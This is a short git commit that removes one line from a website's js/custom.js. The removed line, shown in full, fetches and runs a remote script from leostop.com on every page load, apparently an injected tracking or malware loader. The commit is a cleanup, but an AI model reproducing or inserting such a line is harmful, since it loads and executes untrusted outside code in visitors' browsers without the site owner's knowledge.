e1674e4d051b994367c2017b19d920386f8761c2
sepiol707 <sepiol707@protonmail.com>
2022-04-09 01:57:43 +0700

    f track

--- js/custom.js
+++ js/custom.js
@@ -66,7 +66,6 @@ $(function () {
 	});
 
 
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 	/* Fancybox
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
